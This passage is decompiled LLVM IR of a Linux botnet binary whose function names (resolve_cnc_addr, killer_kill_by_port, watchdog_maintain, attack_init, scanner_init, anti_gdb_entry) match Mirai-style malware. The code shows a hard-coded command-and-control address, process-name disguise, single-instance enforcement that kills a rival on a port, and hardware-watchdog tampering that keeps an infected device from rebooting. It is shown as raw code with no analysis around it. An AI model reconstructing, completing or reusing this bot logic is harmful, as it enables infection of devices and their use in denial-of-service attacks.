  %v0_d414 = phi i32 [ 0, %dec_label_pc_d400.lr.ph ], [ %v1_d414, %dec_label_pc_d414 ]
  %v1_d400 = phi i32 [ 0, %dec_label_pc_d400.lr.ph ], [ %v1_d40086, %dec_label_pc_d414 ]
  %v0_d3f8 = add i32 %v0_d3f8.in, -1
  %v2_d400 = add i32 %v1_d400, %v0_d400.pre
  %v3_d400 = inttoptr i32 %v2_d400 to i8*
  %v4_d400 = load i8, i8* %v3_d400, align 1
  %v6_d400 = zext i8 %v4_d400 to i32
  store i32 %v6_d400, i32* %r2.global-to-local, align 4
  %v2_d404 = add i32 %v0_d414, %v1_d404.pre
  %v3_d404 = inttoptr i32 %v2_d404 to i8*
  %v4_d404 = load i8, i8* %v3_d404, align 1
  %v6_d404 = zext i8 %v4_d404 to i32
  store i32 %v6_d404, i32* @r3, align 4
  %v9_d408 = icmp eq i8 %v4_d404, %v4_d400
  br i1 %v9_d408, label %dec_label_pc_d450, label %bb132

bb132:                                            ; preds = %dec_label_pc_d400
  br label %dec_label_pc_d414

dec_label_pc_d414:                                ; preds = %bb132, %dec_label_pc_d450
  %v1_d40086 = phi i32 [ %v1_d450, %dec_label_pc_d450 ], [ 0, %bb132 ]
  %v1_d414 = add i32 %v0_d414, 1
  store i32 %v1_d414, i32* %r1.global-to-local, align 4
  %v2_d3f8 = icmp eq i32 %v0_d3f8, 0
  br i1 %v2_d3f8, label %dec_label_pc_d3ac.backedge, label %dec_label_pc_d400

dec_label_pc_d41c:                                ; preds = %dec_label_pc_d434
  %v1_d41c = add i32 %v1_d434, 1
  store i32 %v1_d41c, i32* @lr, align 4
  %v9_d420 = icmp eq i32 %v3_d3c8, %v1_d41c
  br i1 %v9_d420, label %dec_label_pc_d45c, label %dec_label_pc_d42c.backedge

dec_label_pc_d42c.backedge:                       ; preds = %dec_label_pc_d41c, %dec_label_pc_d448
  %v1_d43477 = phi i32 [ 0, %dec_label_pc_d448 ], [ %v1_d41c, %dec_label_pc_d41c ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d42c = add i32 %v0_d42c, -1
  store i32 %v1_d42c, i32* %r1.global-to-local, align 4
  %v2_d42c = icmp eq i32 %v0_d42c, 0
  br i1 %v2_d42c, label %dec_label_pc_d3e0, label %dec_label_pc_d434

dec_label_pc_d434:                                ; preds = %dec_label_pc_d42c.backedge, %dec_label_pc_d434.lr.ph
  %v0_d42c = phi i32 [ %v1_d42c39, %dec_label_pc_d434.lr.ph ], [ %v1_d42c, %dec_label_pc_d42c.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d434.lr.ph ], [ %storemerge, %dec_label_pc_d42c.backedge ]
  %v1_d434 = phi i32 [ 0, %dec_label_pc_d434.lr.ph ], [ %v1_d43477, %dec_label_pc_d42c.backedge ]
  %v2_d434 = add i32 %v1_d434, %v0_d434.pre
  %v3_d434 = inttoptr i32 %v2_d434 to i8*
  %v4_d434 = load i8, i8* %v3_d434, align 1
  %v6_d434 = zext i8 %v4_d434 to i32
  store i32 %v6_d434, i32* %r2.global-to-local, align 4
  %v2_d438 = add i32 %storemerge.in, %v1_d438.pre
  %v3_d438 = inttoptr i32 %v2_d438 to i8*
  %v4_d438 = load i8, i8* %v3_d438, align 1
  %v6_d438 = zext i8 %v4_d438 to i32
  store i32 %v6_d438, i32* @r3, align 4
  %v9_d43c = icmp eq i8 %v4_d438, %v4_d434
  br i1 %v9_d43c, label %dec_label_pc_d41c, label %dec_label_pc_d448

dec_label_pc_d448:                                ; preds = %dec_label_pc_d434
  br label %dec_label_pc_d42c.backedge

dec_label_pc_d450:                                ; preds = %dec_label_pc_d400
  %v1_d450 = add i32 %v1_d400, 1
  %v9_d454 = icmp eq i32 %v3_d3e4, %v1_d450
  br i1 %v9_d454, label %dec_label_pc_d45c, label %dec_label_pc_d414

dec_label_pc_d45c:                                ; preds = %dec_label_pc_d41c, %dec_label_pc_d450
  %v1_d460 = call i32 @table_lock_val(i32 18)
  %v1_d468 = call i32 @table_lock_val(i32 19)
  %v0_d46c = load i32, i32* @sl, align 4
  %v1_d470 = call i32 @__GI___libc_close(i32 %v0_d46c)
  %v0_d474 = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d47c = call i32 @kill(i32 %v0_d474, i32 9)
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d354, %dec_label_pc_d4b0, %dec_label_pc_d45c
  store i32 %v2_d1e0, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d488 = call i32 @util_zero()
  store i32 %v2_d230, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d498 = call i32 @util_zero()
  %v1_d4a0 = call i32 @sleep(i32 1)
  store i32 %v2_d1b8, i32* @r4, align 4
  %v0_d4a8 = load i32, i32* @r8, align 4
  store i32 %v0_d4a8, i32* @r5, align 4
  br label %dec_label_pc_d108.backedge

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d3ac.backedge, %dec_label_pc_d36c
  %v1_d4b4 = call i32 @table_lock_val(i32 18)
  %v1_d4bc = call i32 @table_lock_val(i32 19)
  %v0_d4c0 = load i32, i32* @sl, align 4
  %v1_d4c4 = call i32 @__GI___libc_close(i32 %v0_d4c0)
  br label %dec_label_pc_d480

; uselistorder directives
  uselistorder i32 %v1_d450, { 1, 0 }
  uselistorder i32 %v1_d414, { 1, 0 }
  uselistorder i32 %v1_d400, { 1, 0 }
  uselistorder i32 %v0_d414, { 1, 0 }
  uselistorder i32 %v1_d3b8, { 1, 0 }
  uselistorder i32 %v2_d35c, { 1, 0 }
  uselistorder i1 %v7_d338, { 1, 0 }
  uselistorder i32 %v2_d334, { 1, 0 }
  uselistorder i32 %v2_d10c, { 1, 0 }
  uselistorder i32 %stack_var_-8388.1.be, { 1, 0 }
  uselistorder i32 %v3_d28c, { 1, 2, 0 }
  uselistorder i32 %v2_d19c, { 1, 0 }
  uselistorder i32 %v1_d13c, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d118, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8388.0, { 1, 0 }
  uselistorder i32 %v2_d3a8, { 1, 0, 2 }
  uselistorder i32 %v2_d230, { 1, 0, 2, 3 }
  uselistorder i32 %v3_d050, { 1, 0 }
  uselistorder i32 %v2_d01c, { 2, 0, 1 }
  uselistorder i32 %v3_cfc8, { 1, 0 }
  uselistorder i32 %v1_cfb8, { 3, 2, 0, 4, 6, 5, 8, 7, 9, 10, 1, 11, 12, 13, 14 }
  uselistorder i32 %storemerge96, { 1, 0 }
  uselistorder i32 %v0_cf28, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 2, 1, 36, 3, 37, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32, i32)* @kill, { 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_243d8.75, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d480, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d45c, { 1, 0 }
  uselistorder label %dec_label_pc_d42c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d414, { 1, 0 }
  uselistorder label %dec_label_pc_d3c4, { 1, 0 }
  uselistorder label %dec_label_pc_d354, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d108.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d2e8, { 1, 0 }
  uselistorder label %dec_label_pc_d118, { 1, 0 }
  uselistorder label %dec_label_pc_d118.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d658.81 to i32), i32* @global_var_21748.83, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i16, align 2
  %stack_var_-28 = alloca i32, align 4
  %v9_d4f4 = load i32, i32* @r6, align 4
  %v12_d4f4 = load i32, i32* @r7, align 4
  %v15_d4f4 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d510 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_21740.85 to i32), i32* @r6, align 4
  %v7_d518 = icmp eq i32 %v3_d510, -1
  store i32 %v3_d510, i32* @global_var_21740.85, align 4
  br i1 %v7_d518, label %dec_label_pc_d5d0, label %dec_label_pc_d524

dec_label_pc_d524:                                ; preds = %entry
  %v2_d524 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d524, i32* @r3, align 4
  %v0_d528 = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d538 = call i32 @__GI_setsockopt(i32 %v3_d510, i32 %v0_d528, i32 2, i32 %v2_d524, i32 4)
  %v2_d53c = load i32, i32* @global_var_21740.85, align 4
  store i32 %v2_d53c, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d54c = call i32 @__libc_fcntl(i32 %v2_d53c, i32 3)
  %v0_d550 = load i32, i32* @r5, align 4
  %v1_d554 = or i32 %v2_d54c, 2048
  store i32 %v1_d554, i32* @r2, align 4
  %v0_d558 = load i32, i32* @r4, align 4
  %v2_d55c = call i32 @__libc_fcntl(i32 %v0_d558, i32 %v0_d550)
  store i32 ptrtoint (i8** @global_var_2174c.87 to i32), i32* @r8, align 4
  %v2_d564 = load i8, i8* bitcast (i8** @global_var_2174c.87 to i8*), align 4
  %v2_d568 = icmp eq i8 %v2_d564, 0
  br i1 %v2_d568, label %.thread3, label %bb

.thread3:                                         ; preds = %dec_label_pc_d524
  br label %bb21

bb:                                               ; preds = %dec_label_pc_d524
  br label %bb21

bb21:                                             ; preds = %.thread3, %bb
  %v0_d58c = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d594 = inttoptr i32 %v0_d58c to i32*
  store i32 0, i32* %v2_d594, align 4
  %v2_d598 = ptrtoint i16* %stack_var_-44 to i32
  store i32 %v2_d598, i32* @r5, align 4
  store i32 %v0_d58c, i32* @r4, align 4
  %v2_d5a8 = load i32, i32* @global_var_21740.85, align 4
  store i16 2, i16* %stack_var_-44, align 2
  %v7_d5b4 = call i32 @bind(i32 %v2_d5a8, i32 %v2_d598, i32 16, i32 2, i32 2)
  %v7_d5b8 = icmp eq i32 %v7_d5b4, -1
  br i1 %v7_d5b8, label %dec_label_pc_d5dc, label %dec_label_pc_d5c0

dec_label_pc_d5c0:                                ; preds = %bb21
  %v2_d5c8 = load i32, i32* @global_var_21740.85, align 4
  %v2_d5cc = call i32 @listen(i32 %v2_d5c8, i32 1)
  br label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %entry, %dec_label_pc_d5e8, %dec_label_pc_d5c0
  %v1_d5d8 = phi i32 [ %v3_d510, %entry ], [ %v1_d630, %dec_label_pc_d5e8 ], [ %v2_d5cc, %dec_label_pc_d5c0 ]
  store i32 %v9_d4f4, i32* @r6, align 4
  store i32 %v12_d4f4, i32* @r7, align 4
  store i32 %v15_d4f4, i32* @r8, align 4
  ret i32 %v1_d5d8

dec_label_pc_d5dc:                                ; preds = %bb21
  %v0_d5dc = load i32, i32* @r4, align 4
  %v1_d5dc = inttoptr i32 %v0_d5dc to i32*
  %v2_d5dc = load i32, i32* %v1_d5dc, align 4
  %v7_d5e0 = icmp eq i32 %v2_d5dc, 99
  br i1 %v7_d5e0, label %dec_label_pc_d638, label %dec_label_pc_d5e8

dec_label_pc_d5e8:                                ; preds = %dec_label_pc_d638, %bb22, %dec_label_pc_d5dc
  %v2_d600 = load i32, i32* @global_var_21740.85, align 4
  store i16 2, i16* %stack_var_-44, align 2
  %v3_d610 = call i32 @__libc_connect(i32 %v2_d600, i32 %v2_d598, i32 16)
  %v1_d618 = call i32 @sleep(i32 5)
  %v2_d61c = load i32, i32* @global_var_21740.85, align 4
  %v1_d620 = call i32 @__GI___libc_close(i32 %v2_d61c)
  %v1_d62c = call i32 @killer_kill_by_port(i32 34311)
  %v1_d630 = call i32 @ensure_single_instance(i32 %v1_d62c)
  br label %dec_label_pc_d5d0

dec_label_pc_d638:                                ; preds = %dec_label_pc_d5dc
  %v2_d638 = load i8, i8* bitcast (i8** @global_var_2174c.87 to i8*), align 4
  %v3_d638 = zext i8 %v2_d638 to i32
  %v1_d63c = load i32, i32* @r7, align 4
  %v9_d63c = icmp eq i32 %v3_d638, %v1_d63c
  br i1 %v9_d63c, label %dec_label_pc_d5e8, label %bb22

bb22:                                             ; preds = %dec_label_pc_d638
  %v2_d644 = trunc i32 %v1_d63c to i8
  store i8 %v2_d644, i8* bitcast (i8** @global_var_2174c.87 to i8*), align 4
  br label %dec_label_pc_d5e8

; uselistorder directives
  uselistorder i32 %v2_d598, { 1, 0, 2 }
  uselistorder i32 %v3_d510, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i16* %stack_var_-44, { 2, 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bind, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_2174c.87 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_2174c.87, { 1, 0 }
  uselistorder label %dec_label_pc_d5e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d5d0, { 1, 2, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_d660 = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_18f4c.90 to i32), i32* @r0, align 4
  %v2_d668 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_18f4c.90 to i32))
  store i32 ptrtoint (i16** @global_var_243e0.92 to i32), i32* @r4, align 4
  store i32 %v2_d668, i32* @global_var_243e4.93, align 4
  %v3_d67c = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_d67c = inttoptr i32 %v3_d67c to i16*
  %v3_d680 = load i16, i16* %v4_d67c, align 2
  store i16 %v3_d680, i16* bitcast (i32* @global_var_243e2.94 to i16*), align 4
  %v1_d68c = call i32 @table_lock_val(i32 1)
  ret i32 %v1_d68c
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_d6a0 = load i32, i32* @r4, align 4
  %v6_d6a0 = load i32, i32* @r5, align 4
  %v9_d6a0 = load i32, i32* @lr, align 4
  %v0_d6a8 = call i32 @__libc_fork()
  %v7_d6ac = icmp eq i32 %v0_d6a8, -1
  %. = zext i1 %v7_d6ac to i32
  %tmp11 = icmp slt i32 %v0_d6a8, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d6c8 = icmp eq i32 %storemerge4, 0
  store i32 %v0_d6a8, i32* @global_var_218c0.96, align 4
  br i1 %v2_d6c8, label %dec_label_pc_d6e0, label %dec_label_pc_d6d4

dec_label_pc_d6d4:                                ; preds = %entry
  store i32 %v3_d6a0, i32* @r4, align 4
  store i32 %v6_d6a0, i32* @r5, align 4
  store i32 %v9_d6a0, i32* @lr, align 4
  ret i32 %v0_d6a8

dec_label_pc_d6e0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d6ec = call i32 @table_unlock_val(i32 23)
  %v1_d6f4 = call i32 @table_unlock_val(i32 24)
  %v0_d6f8 = load i32, i32* @r5, align 4
  %v2_d700 = inttoptr i32 %v0_d6f8 to i32*
  %v3_d700 = call i32 @table_retrieve_val(i32 23, i32* %v2_d700)
  %v2_d708 = call i32 @__libc_open(i32 %v3_d700, i32 2)
  %v7_d70c = icmp eq i32 %v2_d708, -1
  store i32 %v2_d708, i32* @r4, align 4
  br i1 %v7_d70c, label %dec_label_pc_d754, label %dec_label_pc_d718

dec_label_pc_d718:                                ; preds = %dec_label_pc_d754, %dec_label_pc_d6e0
  %v0_d724 = phi i32 [ %v2_d764, %dec_label_pc_d754 ], [ %v2_d708, %dec_label_pc_d6e0 ]
  %v2_d728 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d72c = call i32 @ioctl(i32 %v0_d724, i32 -2147199228, i32 %v2_d728)
  br label %dec_label_pc_d730

dec_label_pc_d730:                                ; preds = %dec_label_pc_d730, %dec_label_pc_d718
  %v0_d73c = load i32, i32* @r4, align 4
  %v3_d744 = call i32 @ioctl(i32 %v0_d73c, i32 -2147199227, i32 0)
  %v1_d74c = call i32 @sleep(i32 10)
  br label %dec_label_pc_d730

dec_label_pc_d754:                                ; preds = %dec_label_pc_d6e0
  %v0_d754 = load i32, i32* @r5, align 4
  %v2_d75c = inttoptr i32 %v0_d754 to i32*
  %v3_d75c = call i32 @table_retrieve_val(i32 24, i32* %v2_d75c)
  %v2_d764 = call i32 @__libc_open(i32 %v3_d75c, i32 2)
  %v3_d768 = icmp eq i32 %v2_d764, -1
  store i32 %v2_d764, i32* @r4, align 4
  br i1 %v3_d768, label %dec_label_pc_d774, label %dec_label_pc_d718

dec_label_pc_d774:                                ; preds = %dec_label_pc_d754
  %v1_d778 = call i32 @table_lock_val(i32 23)
  %v1_d780 = call i32 @table_lock_val(i32 24)
  %v0_d784 = load i32, i32* @r5, align 4
  %v1_d788 = call i32 @__GI_exit(i32 %v0_d784)
  %v0_d78c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d78c, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d774
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d774, %bb14
  ret i32 %v1_d788

; uselistorder directives
  uselistorder i32 %v2_d764, { 1, 2, 0 }
  uselistorder i32 %v2_d708, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d6a8, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1416 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_d79c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d79c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d7b4 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_d7c0 = call i32 @__GI_sigaddset(i32 %v2_d79c, i32 2)
  %v0_d7c4 = load i32, i32* @r5, align 4
  store i32 %v0_d7c4, i32* %r2.global-to-local, align 4
  %v4_d7d0 = call i32 @__GI_sigprocmask(i32 %v0_d7c4, i32* nonnull %stack_var_-64, i32 %v0_d7c4)
  %v2_d7dc = call i32 @bsd_signal(i32 17, i32 1)
  %v2_d7e8 = call i32 @bsd_signal(i32 5, i32 54492)
  %v0_d7ec = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_243e0.92 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_243e4.93, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d7ec, i32* @global_var_243d4.57, align 4
  store i16 5888, i16* bitcast (i32* @global_var_243e2.94 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_243e0.92 to i16*), align 4
  %v6_d814 = call i32 @table_init(i32 %v0_d7ec, i32 ptrtoint (i32* @global_var_243d4.57 to i32), i32 ptrtoint (i16** @global_var_243e0.92 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d658.81 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21748.83 to i32), i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_d658.81 to i32), i32* @global_var_21748.83, align 4
  %v1_d824 = call i32 @ensure_single_instance(i32 %v6_d814)
  %v1_d828 = call i32 @rand_init(i32 %v1_d824)
  %v2_d830 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_d830, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d838 = call i32 @util_zero()
  %v0_d83c = load i32, i32* @r6, align 4
  %v7_d83c = icmp eq i32 %v0_d83c, 2
  br i1 %v7_d83c, label %dec_label_pc_d974, label %dec_label_pc_d844

dec_label_pc_d844:                                ; preds = %dec_label_pc_d974, %entry, %dec_label_pc_d984
  %v0_d844 = call i32 @rand_next()
  store i32 %v0_d844, i32* @r6, align 4
  %v0_d84c = load i32, i32* @r8, align 4
  %v1_d84c = inttoptr i32 %v0_d84c to i32*
  %v2_d84c = load i32, i32* %v1_d84c, align 4
  %v1_d850 = inttoptr i32 %v2_d84c to i8*
  %v2_d850 = call i32 @util_strlen(i8* %v1_d850)
  %v0_d858 = load i32, i32* @r8, align 4
  %v1_d858 = inttoptr i32 %v0_d858 to i32*
  %v2_d858 = load i32, i32* %v1_d858, align 4
  %v1_d85c = inttoptr i32 %v2_d858 to i8*
  %v2_d85c = call i32 @util_strlen(i8* %v1_d85c)
  %v1_d860 = sub i32 20, %v2_d850
  %v0_d868 = load i32, i32* @r6, align 4
  %v3_d86c = urem i32 %v0_d868, %v1_d860
  %v2_d874 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_d874, i32* @r5, align 4
  %v2_d878 = add i32 %v3_d86c, %v2_d85c
  store i32 %v2_d878, i32* @r4, align 4
  %v2_d884 = call i32 @rand_alpha_str(i32 %v2_d874, i32 %v2_d878)
  %v2_d88c = ptrtoint i32* %stack_var_-40 to i32
  %v1_d890 = load i32, i32* @r4, align 4
  %v2_d890 = add i32 %v1_d890, %v2_d88c
  store i32 %v2_d890, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_d89c = load i32, i32* @r8, align 4
  %v1_d89c = inttoptr i32 %v0_d89c to i32*
  %v2_d89c = load i32, i32* %v1_d89c, align 4
  store i32 %v2_d89c, i32* @r0, align 4
  %v3_d8a0 = add i32 %v2_d890, -64
  %v4_d8a0 = inttoptr i32 %v3_d8a0 to i8*
  store i8 0, i8* %v4_d8a0, align 1
  %v2_d8a4 = inttoptr i32 %v2_d89c to i8*
  %v3_d8a4 = call i32 @util_strcpy(i8* %v2_d8a4, i32 %v2_d874)
  store i32 32, i32* @r1, align 4
  store i32 %v2_d874, i32* @r0, align 4
  %v0_d8b0 = call i32 @util_zero()
  %v0_d8b4 = call i32 @rand_next()
  store i32 %v0_d8b4, i32* @r7, align 4
  %v0_d8bc = load i32, i32* @r8, align 4
  %v1_d8bc = inttoptr i32 %v0_d8bc to i32*
  %v2_d8bc = load i32, i32* %v1_d8bc, align 4
  %v1_d8c0 = inttoptr i32 %v2_d8bc to i8*
  %v2_d8c0 = call i32 @util_strlen(i8* %v1_d8c0)
  store i32 %v2_d8c0, i32* @r6, align 4
  %v0_d8c8 = load i32, i32* @r8, align 4
  %v1_d8c8 = inttoptr i32 %v0_d8c8 to i32*
  %v2_d8c8 = load i32, i32* %v1_d8c8, align 4
  %v1_d8cc = inttoptr i32 %v2_d8c8 to i8*
  %v2_d8cc = call i32 @util_strlen(i8* %v1_d8cc)
  %v0_d8d0 = load i32, i32* @r6, align 4
  %v1_d8d0 = sub i32 20, %v0_d8d0
  %v0_d8d8 = load i32, i32* @r7, align 4
  %v3_d8dc = urem i32 %v0_d8d8, %v1_d8d0
  %v2_d8e0 = add i32 %v3_d8dc, %v2_d8cc
  store i32 %v2_d8e0, i32* @r4, align 4
  %v2_d8ec = call i32 @rand_alpha_str(i32 %v2_d874, i32 %v2_d8e0)
  store i32 %v2_d88c, i32* %r2.global-to-local, align 4
  %v1_d8f8 = load i32, i32* @r4, align 4
  %v2_d8f8 = add i32 %v1_d8f8, %v2_d88c
  store i32 %v2_d8f8, i32* %r3.global-to-local, align 4
  %v0_d8fc = load i32, i32* @sb, align 4
  %v1_d8fc = trunc i32 %v0_d8fc to i8
  %v3_d8fc = add i32 %v2_d8f8, -64
  %v4_d8fc = inttoptr i32 %v3_d8fc to i8*
  store i8 %v1_d8fc, i8* %v4_d8fc, align 1
  %v4_d908 = call i32 @prctl(i32 15, i32 %v2_d874, i32 %v2_d88c, i32 %v2_d8f8)
  %v1_d910 = call i32 @table_unlock_val(i32 3)
  %v3_d91c = call i32 @table_retrieve_val(i32 3, i32* nonnull %stack_var_-48)
  %v3_d920 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d920, i32* @r2, align 4
  %v2_d92c = call i32 @__GI___libc_write(i32 1, i32 %v3_d91c)
  store i32 1, i32* @r2, align 4
  %v2_d93c = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_18f5c.104 to i32))
  %v1_d944 = call i32 @table_lock_val(i32 3)
  %v1_d948 = call i32 @attack_init(i32 %v1_d944)
  %v1_d94c = call i32 @killer_init(i32 %v1_d948)
  %v1_d950 = call i32 @watchdog_maintain(i32 %v1_d94c)
  %v0_d954 = call i32 @__libc_fork()
  %v1_d958 = load i32, i32* @sb, align 4
  %v7_d95c = icmp sgt i32 %v0_d954, %v1_d958
  br i1 %v7_d95c, label %dec_label_pc_d960, label %dec_label_pc_d9b0

dec_label_pc_d960:                                ; preds = %dec_label_pc_d844
  ret i32 %v1_d958

dec_label_pc_d974:                                ; preds = %entry
  %v0_d974 = load i32, i32* @r8, align 4
  %v1_d974 = add i32 %v0_d974, 4
  %v2_d974 = inttoptr i32 %v1_d974 to i32*
  %v3_d974 = load i32, i32* %v2_d974, align 4
  %v1_d978 = inttoptr i32 %v3_d974 to i8*
  %v2_d978 = call i32 @util_strlen(i8* %v1_d978)
  %v8_d980 = icmp sgt i32 %v2_d978, 31
  br i1 %v8_d980, label %dec_label_pc_d844, label %dec_label_pc_d984

dec_label_pc_d984:                                ; preds = %dec_label_pc_d974
  %v0_d988 = load i32, i32* @r8, align 4
  %v1_d988 = add i32 %v0_d988, 4
  %v2_d988 = inttoptr i32 %v1_d988 to i32*
  %v3_d988 = load i32, i32* %v2_d988, align 4
  store i32 %v2_d830, i32* @r0, align 4
  %v2_d990 = bitcast i32* %stack_var_-136 to i8*
  %v3_d990 = call i32 @util_strcpy(i8* %v2_d990, i32 %v3_d988)
  %v0_d994 = load i32, i32* @r8, align 4
  %v1_d994 = add i32 %v0_d994, 4
  %v2_d994 = inttoptr i32 %v1_d994 to i32*
  %v3_d994 = load i32, i32* %v2_d994, align 4
  %v1_d99c = inttoptr i32 %v3_d994 to i8*
  %v2_d99c = call i32 @util_strlen(i8* %v1_d99c)
  store i32 %v2_d99c, i32* @r1, align 4
  store i32 %v3_d994, i32* @r0, align 4
  %v0_d9a8 = call i32 @util_zero()
  br label %dec_label_pc_d844

dec_label_pc_d9b0:                                ; preds = %dec_label_pc_d844
  %v1_d9b0 = call i32 @__GI_setsid(i32 %v0_d954)
  %v0_d9b4 = load i32, i32* @sb, align 4
  %v1_d9b8 = call i32 @__GI___libc_close(i32 %v0_d9b4)
  %v1_d9c0 = call i32 @__GI___libc_close(i32 1)
  %v1_d9c8 = call i32 @__GI___libc_close(i32 2)
  %v1_d9cc = call i32 @attack_init(i32 %v1_d9c8)
  %v1_d9d0 = call i32 @killer_init(i32 %v1_d9cc)
  %v1_d9d4 = call i32 @watchdog_maintain(i32 %v1_d9d0)
  %v1_d9d8 = call i32 @scanner_init(i32 %v1_d9d4)
  store i32 ptrtoint (i32* @global_var_21740.85 to i32), i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_21744.107 to i32), i32* @sl, align 4
  %v2_d9ec = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_d9ec, i32* @r6, align 4
  %v2_d9f0 = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_d9f0, i32* @r7, align 4
  %v2_dad0 = ptrtoint i32* %stack_var_-72 to i32
  %v2_db18 = ptrtoint i32* %stack_var_-144 to i32
  %v2_dde0 = ptrtoint i8** %stack_var_-42 to i32
  %v2_dc78 = ptrtoint i32* %stack_var_-1416 to i32
  %v2_dd70 = ptrtoint i32* %stack_var_-52 to i32
  %v2_dd74 = ptrtoint i32* %stack_var_-56 to i32
  %v1_de30 = bitcast i32* %stack_var_-136 to i8*
